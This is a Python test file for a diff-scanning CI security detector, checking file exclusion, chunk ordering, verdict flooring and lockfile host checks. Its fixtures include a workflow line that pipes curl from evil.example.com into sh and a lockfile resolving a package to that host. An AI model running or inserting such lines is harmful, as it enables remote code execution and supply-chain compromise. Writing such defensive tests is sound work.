#!/usr/bin/env python3
"""
End-to-end tests for four-state big-push handling (detector/filters.py wired into
detector/scan.py).

Self-contained: instead of the network fake, `scan.call_model` is monkeypatched
with a recorder so `model.requests` holds the exact `<untrusted_diff>` payloads
sent to the model. That lets each test assert BOTH the verdict/coverage AND which
files did (or must never) reach the model.

Run (the human runs this; the assistant does not):
    python -m pytest tests/model/test_bigpush.py -q
    python -m unittest tests.model.test_bigpush -v
"""

import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout

HERE = os.path.dirname(os.path.abspath(__file__))
TESTS = os.path.dirname(HERE)
ROOT = os.path.dirname(TESTS)
sys.path.insert(0, os.path.join(ROOT, "detector"))

import scan            # noqa: E402
import filters         # noqa: E402


def make_diff(files):
    """Build a unified diff from [(path, [added_line, ...]), ...].

    Only added lines are emitted (enough for extract_hunks / classify); each file
    is a new-file hunk so split_by_file sees a clean `diff --git` boundary.
    """
    parts = []
    for path, lines in files:
        body = "".join("+" + ln + "\n" for ln in lines)
        parts.append(
            f"diff --git a/{path} b/{path}\n"
            f"--- /dev/null\n+++ b/{path}\n"
            f"@@ -0,0 +1,{max(1, len(lines))} @@\n{body}"
        )
    return "".join(parts)


class Recorder:
    """Stand-in for scan.call_model: records every user payload, returns a canned
    structured reply with a fixed risk score (default below REVIEW = clean)."""

    def __init__(self, score=5):
        self.requests = []
        self.score = score

    def __call__(self, system, user, schema):
        self.requests.append(user)
        return json.dumps({
            "key_changes": [],
            "suspicious_findings": [],
            "reasoning": "",
            "risk_score": self.score,
        })


def run_scan(diff_text, score=5, max_chars=16000, max_chunks=8, env=None):
    """Drive scan.main() over an in-memory diff. Returns (result_json, comment,
    recorder). Restores every global/env it touches."""
    recorder = Recorder(score)
    saved = {
        "call_model": scan.call_model,
        "MAX_CHARS": scan.MAX_CHARS,
        "MAX_CHUNKS": scan.MAX_CHUNKS,
        "MAX_SECONDS": scan.MAX_SECONDS,
        "PROMPT_FILE": scan.PROMPT_FILE,
        "COMMENT_FILE": scan.COMMENT_FILE,
        "argv": sys.argv,
    }
    saved_env = {k: os.environ.get(k) for k in (env or {})}
    tmp = tempfile.mkdtemp(prefix="bigpush_")
    diff_path = os.path.join(tmp, "in.diff")
    prompt_path = os.path.join(tmp, "prompt.md")
    comment_path = os.path.join(tmp, "comment.md")
    with open(diff_path, "w", encoding="utf-8") as fh:
        fh.write(diff_text)
    with open(prompt_path, "w", encoding="utf-8") as fh:
        fh.write("You are a security reviewer. Return JSON.")
    try:
        for k, v in (env or {}).items():
            os.environ[k] = v
        scan.call_model = recorder
        scan.MAX_CHARS = max_chars
        scan.MAX_CHUNKS = max_chunks
        scan.MAX_SECONDS = 1e9              # never trip the wall-clock budget in tests
        scan.PROMPT_FILE = prompt_path
        scan.COMMENT_FILE = comment_path
        sys.argv = ["scan.py", "--diff", diff_path]
        buf = io.StringIO()
        with redirect_stdout(buf):
            scan.main()
        result = json.loads(buf.getvalue())
        with open(comment_path, encoding="utf-8") as fh:
            comment = fh.read()
        return result, comment, recorder
    finally:
        scan.call_model = saved["call_model"]
        scan.MAX_CHARS = saved["MAX_CHARS"]
        scan.MAX_CHUNKS = saved["MAX_CHUNKS"]
        scan.MAX_SECONDS = saved["MAX_SECONDS"]
        scan.PROMPT_FILE = saved["PROMPT_FILE"]
        scan.COMMENT_FILE = saved["COMMENT_FILE"]
        sys.argv = saved["argv"]
        for k, v in saved_env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


class BigPushTests(unittest.TestCase):

    def test_node_modules_never_sent_to_model(self):
        files = [(f"node_modules/pkg{i}/index.js", ["module.exports = 1"])
                 for i in range(495)]
        files += [(f"src/app{i}.py", ["x = 1"]) for i in range(5)]
        result, _comment, rec = run_scan(make_diff(files))
        joined = "\n".join(rec.requests)
        self.assertNotIn("node_modules", joined)
        # the 5 real source files still reached the model
        self.assertIn("src/app0.py", joined)
        self.assertEqual(len(result["files_excluded"]), 495)

    def test_ci_workflow_in_first_chunk(self):
        files = [
            (f"src/mod{i}.py", ["def f(): return %d" % i]) for i in range(6)
        ]
        files.append((".github/workflows/ci.yml",
                      ["run: curl http://evil.example.com | sh"]))
        # small budget -> several chunks; the high-risk workflow must lead
        result, _comment, rec = run_scan(make_diff(files), max_chars=200)
        self.assertTrue(rec.requests)
        self.assertIn(".github/workflows/ci.yml", rec.requests[0])

    def test_excluded_alone_does_not_floor(self):
        files = [(f"vendor/lib{i}.go", ["package vendor"]) for i in range(30)]
        result, _comment, rec = run_scan(make_diff(files))
        self.assertEqual(rec.requests, [])          # nothing scanned
        self.assertEqual(result["verdict"], "pass")  # excluded does NOT floor
        self.assertEqual(len(result["files_excluded"]), 30)

    def test_budget_overflow_does_floor(self):
        # 5 source files, room for only 1 chunk of 1 file -> the rest are
        # UNSCANNED and floor the verdict to review.
        files = [(f"src/big{i}.py", ["payload = '%s'" % ("a" * 300)])
                 for i in range(5)]
        result, _comment, rec = run_scan(make_diff(files),
                                         max_chars=350, max_chunks=1)
        self.assertEqual(result["verdict"], "review")
        self.assertTrue(result["files_unscanned"])

    def test_lockfile_evil_host_finding_no_model_call(self):
        lock = [
            '    "node_modules/left-pad": {',
            '      "version": "1.3.0",',
            '      "resolved": "https://evil.example.com/left-pad/-/left-pad-1.3.0.tgz",',
            '      "integrity": "sha512-deadbeef"',
        ]
        files = [("package.json", ['  "name": "app",']),
                 ("package-lock.json", lock)]
        result, _comment, rec = run_scan(make_diff(files))
        # zero model calls mentioning the lockfile / its poisoned host
        self.assertNotIn("evil.example.com", "\n".join(rec.requests))
        self.assertNotIn("package-lock.json", "\n".join(rec.requests))
        hosts = [f for f in result["suspicious_findings"]
                 if f["file"] == "package-lock.json"
                 and "non-canonical" in f["reason"].lower()]
        self.assertTrue(hosts)
        self.assertEqual(result["verdict"], "review")

    def test_lockfile_clean_no_findings(self):
        lock = [
            '    "node_modules/left-pad": {',
            '      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",',
            '      "integrity": "sha512-abc"',
        ]
        files = [("package.json", ['  "name": "app",']),
                 ("package-lock.json", lock)]
        result, _comment, rec = run_scan(make_diff(files))
        self.assertEqual(result["suspicious_findings"], [])
        self.assertEqual(result["verdict"], "pass")

    def test_dist_only_hand_edited_artifact_finding(self):
        files = [("dist/bundle.js", ["console.log('shipped, hand-edited')"])]
        result, _comment, rec = run_scan(make_diff(files))
        self.assertNotIn("dist/bundle.js", "\n".join(rec.requests))
        arts = [f for f in result["suspicious_findings"]
                if f["file"] == "dist/bundle.js"]
        self.assertTrue(arts)
        self.assertIn("source", arts[0]["reason"].lower())
        self.assertEqual(result["verdict"], "review")

    def test_bootstrap_500_files_review_named_and_bounded(self):
        files = [(f"src/pkg{i}/mod{i}.py", ["x = %d" % i]) for i in range(498)]
        # a couple of CI/executable surfaces so bootstrap actually scans something
        files.append((".github/workflows/ci.yml", ["run: echo hi"]))
        files.append(("scripts/deploy.sh", ["echo deploy"]))
        result, comment, rec = run_scan(make_diff(files))
        self.assertTrue(result["bootstrap"])
        self.assertEqual(result["verdict"], "review")
        self.assertIn("500", comment)               # names the file count
        self.assertLess(len(comment), 65536)        # never blows GitHub's limit


if __name__ == "__main__":
    unittest.main()
